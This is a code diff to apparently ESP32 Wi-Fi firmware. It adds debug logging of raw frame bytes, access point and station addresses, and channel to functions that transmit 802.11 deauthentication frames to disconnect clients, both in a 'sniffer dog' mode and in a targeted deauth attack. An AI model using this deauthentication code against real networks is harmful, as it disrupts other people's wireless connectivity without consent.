@@ -1598,6 +1598,21 @@ static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_typ
              sniffer_dog_current_channel,
              sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
     
+    // Log raw deauth frame bytes (hex)
+    {
+        char hexbuf[3 * sizeof(deauth_frame_default) + 1];
+        char *p = hexbuf;
+        for (size_t i = 0; i < sizeof(deauth_frame_default); i++) {
+            int written = sprintf(p, "%02X", deauth_frame[i]);
+            p += written;
+            if (i + 1 < sizeof(deauth_frame_default)) {
+                *p++ = ' ';
+            }
+        }
+        *p = '\0';
+        ESP_LOGI(TAG, "[SNIFFERDOG] DEAUTH RAW: %s", hexbuf);
+    }
+
     esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
     portENTER_CRITICAL(&snifferdog_stats_spin);
     snifferdog_kick_count++;
@@ -4347,6 +4362,26 @@ static void targeted_deauth_timer_cb(lv_timer_t *timer) {
     // BSSID = AP BSSID
     memcpy(&deauth_frame[16], targeted_deauth_ap_bssid, 6);
     
+    // Log AP info and raw deauth frame
+    {
+        ESP_LOGI(TAG, "[T-DEAUTH] AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X | STA: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
+                 targeted_deauth_ap_bssid[0], targeted_deauth_ap_bssid[1], targeted_deauth_ap_bssid[2],
+                 targeted_deauth_ap_bssid[3], targeted_deauth_ap_bssid[4], targeted_deauth_ap_bssid[5],
+                 targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
+                 targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5],
+                 targeted_deauth_channel);
+
+        char hexbuf[3 * sizeof(deauth_frame_default) + 1];
+        char *p = hexbuf;
+        for (size_t i = 0; i < sizeof(deauth_frame_default); i++) {
+            int written = sprintf(p, "%02X", deauth_frame[i]);
+            p += written;
+            if (i + 1 < sizeof(deauth_frame_default)) *p++ = ' ';
+        }
+        *p = '\0';
+        ESP_LOGI(TAG, "[T-DEAUTH] RAW: %s", hexbuf);
+    }
+
     esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
     targeted_deauth_count++;
     
